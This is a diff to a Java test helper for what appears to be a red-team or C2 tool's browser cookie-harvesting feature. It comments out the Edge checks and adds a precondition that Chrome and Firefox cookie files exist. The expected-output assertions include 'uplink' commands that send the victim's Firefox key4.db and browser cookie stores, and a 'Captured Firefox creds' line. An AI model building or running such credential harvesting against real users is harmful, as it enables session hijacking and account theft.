@@ -25,7 +25,11 @@ import util.Time;
 import util.test.TestConfiguration.OS;
 
 public class HarvestTestHelper {
-	
+
+	public static boolean canAttemptTest() {
+		return Files.exists(Paths.get(CookiesCommandHelper.getChromeCookiesFilename())) && Files.exists(Paths.get(CookiesCommandHelper.getFirefoxCookiesFilename()));
+		//return Files.exists(Paths.get(CookiesCommandHelper.getChromeCookiesFilename())) && Files.exists(Paths.get(CookiesCommandHelper.getEdgeCookiesFilename())) && Files.exists(Paths.get(CookiesCommandHelper.getFirefoxCookiesFilename()));
+	}
 	public static void cleanup() {
 		try {
 			if (Files.exists(Paths.get("test", "fileReceiverTest"))) {
@@ -250,10 +254,10 @@ public static void testCookieHarvestBody(TestCommons.LANGUAGE language) throws I
 		assertEquals("Sent Command: 'uplink C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\fqs6w1w8.default\\key4.db'", line);
 		line = br.readLine();
 		assertEquals("Macro Executor: 'Captured Firefox creds'", line);
-		line = br.readLine();
-		assertEquals("Sent Command: 'uplink C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies'", line);
-		line = br.readLine();
-		assertEquals("Macro Executor: 'Captured Edge Cookies'", line);
+		//line = br.readLine();
+		//assertEquals("Sent Command: 'uplink C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies'", line);
+		//line = br.readLine();
+		//assertEquals("Macro Executor: 'Captured Edge Cookies'", line);
 		
 		System.out.println("Testing nominal all cookies");
 		// Check that the cookies are in local storage
@@ -262,7 +266,7 @@ public static void testCookieHarvestBody(TestCommons.LANGUAGE language) throws I
 		assertTrue(Files.exists(Paths.get(firefoxKeysDb)));
 		assertTrue(Files.exists(Paths.get(firefoxLogins)));
 		assertTrue(Files.exists(Paths.get(chromeAssets)));
-		assertTrue(Files.exists(Paths.get(edgeAssets)));
+		//assertTrue(Files.exists(Paths.get(edgeAssets)));
 
 		String appdata = System.getenv("APPDATA");
 		String realChromeCookies = CookiesCommandHelper.CHROME_COOKIES_FILENAME.replace("%APPDATA%", appdata)
@@ -273,9 +277,9 @@ public static void testCookieHarvestBody(TestCommons.LANGUAGE language) throws I
 		byte[] copiedChromeCookies = Files.readAllBytes(Paths.get(chromeAssets));
 		areFilesEqual(referenceChromeCookies, copiedChromeCookies);
 
-		byte[] referenceEdgeCookies = Files.readAllBytes(Paths.get(realEdgeCookies));
-		byte[] copiedEdgeCookies = Files.readAllBytes(Paths.get(edgeAssets));
-		areFilesEqual(referenceEdgeCookies, copiedEdgeCookies);
+		//byte[] referenceEdgeCookies = Files.readAllBytes(Paths.get(realEdgeCookies));
+		//byte[] copiedEdgeCookies = Files.readAllBytes(Paths.get(edgeAssets));
+		//areFilesEqual(referenceEdgeCookies, copiedEdgeCookies);
 		// TODO:Firefox equal?
 
 		
@@ -293,7 +297,7 @@ public static void testCookieHarvestBody(TestCommons.LANGUAGE language) throws I
 		Files.delete(
 				Paths.get("test" + File.separator + hostname + username + File.separator + "FirefoxMaterials"));
 		Files.delete(Paths.get("test" + File.separator + hostname + username + File.separator + "ChromeMaterials"));
-		Files.delete(Paths.get("test" + File.separator + hostname + username + File.separator + "EdgeMaterials"));
+		//Files.delete(Paths.get("test" + File.separator + hostname + username + File.separator + "EdgeMaterials"));
 		Files.delete(Paths.get("test" + File.separator + hostname + username));
 
 	} catch (Exception ex) {
